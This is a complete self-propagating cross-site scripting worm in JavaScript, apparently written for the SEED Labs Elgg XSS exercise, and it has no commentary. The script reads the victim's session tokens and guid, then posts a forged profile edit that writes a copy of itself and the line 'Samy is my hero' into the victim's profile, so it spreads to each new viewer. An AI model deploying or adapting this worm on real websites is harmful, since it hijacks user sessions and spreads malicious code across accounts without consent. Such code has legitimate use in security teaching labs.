<script id=worm type="text/javascript">
window.onload = function(){
var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
var jsCode = document.getElementById("worm").innerHTML;
var tailTag = "</sc"+"ript>";
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

var userName = elgg.session.user.name;
var guid = "&guid="+elgg.session.user.guid;
var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
var token = "&__elgg_token="+elgg.security.token.__elgg_token;
var bd = "&description=Samy is my hero"+wormCode+"&accesslevel[description]=2"
var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
var content = userName+guid+ts+token+bd;
var samyGuid = 47
if(elgg.session.user.guid!=samyGuid)
{
var Ajax=null;
Ajax = new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
Ajax.send(content);
}
}
</script>